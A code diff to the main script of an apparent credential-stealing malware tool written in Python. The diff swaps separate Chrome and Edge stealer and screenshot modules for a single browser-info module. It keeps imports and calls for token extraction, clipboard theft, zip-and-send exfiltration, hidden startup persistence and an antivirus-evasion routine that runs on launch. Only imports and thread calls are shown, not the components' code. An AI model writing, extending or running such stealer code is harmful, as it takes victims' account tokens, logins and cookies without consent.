@@ -1,8 +1,6 @@
-import threading, sys, time, subprocess, ctypes, os
+import threading, time
 from components.wtoken import TokenExtractor
-from components.screenshot import take_screenshot
-from browsers.chromestealer import extract_logins_cookies_history
-from browsers.edgestealer import edgethief
+from browsers.browserinfo import getinfo
 from components.zipandsend import zipnsend
 from components.info import send_screenshot
 from components.clipboard import steal_data
@@ -10,9 +8,7 @@ from components.startup import hiddenstartup
 from components.confirmsend import confirmsend
 from components.antiantivirus import antiantivirus
 def browser():
-    threading.Thread(target=extract_logins_cookies_history).start()
-    threading.Thread(target=edgethief).start()
-    threading.Thread(target=take_screenshot).start()
+    threading.Thread(target=getinfo).start()
     threading.Thread(target=hiddenstartup).start()
 antiantivirus()
 token_extractor = TokenExtractor()
